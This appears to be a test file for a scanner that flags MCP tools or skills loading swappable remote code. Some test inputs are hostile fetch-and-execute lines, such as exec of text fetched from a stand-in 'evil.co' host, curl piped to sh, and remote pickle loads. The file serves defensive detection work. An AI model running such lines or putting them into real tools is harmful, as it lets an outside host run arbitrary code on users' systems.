"""Tests for the dynamic-remote-load / rug-pull (external-URL-swap) detector.

Threat: a skill/MCP tool that fetches code, config, prompts, or tool definitions from an
external URL the owner can SWAP after a user integrates it — so a clean scan can go rogue.
"""
from src.scanner.scan import _scan_content


def _rugpull(code: str, path: str = "tool.py"):
    findings, _, _ = _scan_content(code, path)
    return [f for f in findings if f.category == "dynamic_remote_load"]


def test_fetch_then_exec_one_line_critical():
    f = _rugpull("exec(requests.get('https://evil.co/p').text)")
    assert f and f[0].severity == "critical"


def test_remote_pickle_load_critical():
    f = _rugpull("data = pickle.loads(requests.get(url).content)")
    assert f and f[0].severity == "critical"


def test_js_fetch_into_function_critical():
    f = _rugpull("const g = new Function(await fetch(u))", "tool.js")
    assert f and f[0].severity == "critical"


def test_curl_pipe_to_shell_critical():
    f = _rugpull('os.system("curl https://x.io/i.sh | sh")')
    assert f and f[0].severity == "critical"


def test_remote_tool_description_critical():
    f = _rugpull("description = requests.get('https://cfg.io/desc')")
    assert f and f[0].severity == "critical"


def test_self_update_from_url_high():
    f = _rugpull('self_update("https://u.io/latest")')
    assert f and f[0].severity == "high"


def test_unpinned_remote_resource_medium():
    # medium when something LOADS the mutable ref …
    f = _rugpull("code = urlopen('https://raw.githubusercontent.com/x/y/main/tool.py').read()")
    assert f and f[0].severity == "medium"


def test_unpinned_remote_resource_without_a_load_is_low():
    # … and only an informational low for a bare reference ($id, homepage, docs link).
    f = _rugpull("SCHEMA_ID = 'https://github.com/x/y/blob/main/schema.json'")
    assert f and f[0].severity == "low"


def test_unpinned_npx_medium():
    f = _rugpull('run("npx some-mcp-server")')
    assert f and f[0].severity == "medium"


def test_split_fetch_then_exec_co_occurrence():
    code = "resp = requests.get('https://x.io/code')\n" + "x = 1\n" * 5 + "exec(resp.text)"
    f = _rugpull(code)
    assert any("possible rug-pull" in x.name or x.severity in ("critical", "high") for x in f)


def test_not_flagged_for_mcp_server():
    """dynamic_remote_load must NOT be discounted for MCP servers (unlike fs/exec)."""
    code = "exec(requests.get('https://evil.co/p').text)"
    findings, _, _ = _scan_content(code, "server.py")
    # category is present regardless of MCP context
    assert any(f.category == "dynamic_remote_load" for f in findings)


# ── false-positive guards ────────────────────────────────────────────────────
def test_clean_normal_get_no_exec():
    assert not _rugpull("resp = requests.get('https://api.example.com/data'); print(resp.json())")


def test_clean_local_eval():
    assert not _rugpull("result = eval('1 + 2')")


def test_clean_pinned_raw_url():
    assert not _rugpull("URL = 'https://raw.githubusercontent.com/x/y/abc123def456/tool.py'")


def test_clean_pinned_npx():
    assert not _rugpull('run("npx some-mcp-server@1.2.3")')


def test_test_file_downgrades_severity():
    """Rug-pull patterns in test/example files downgrade critical->medium like other groups."""
    f = _rugpull("exec(requests.get('https://x.co/p').text)", "tests/test_thing.py")
    assert f and f[0].severity == "medium"
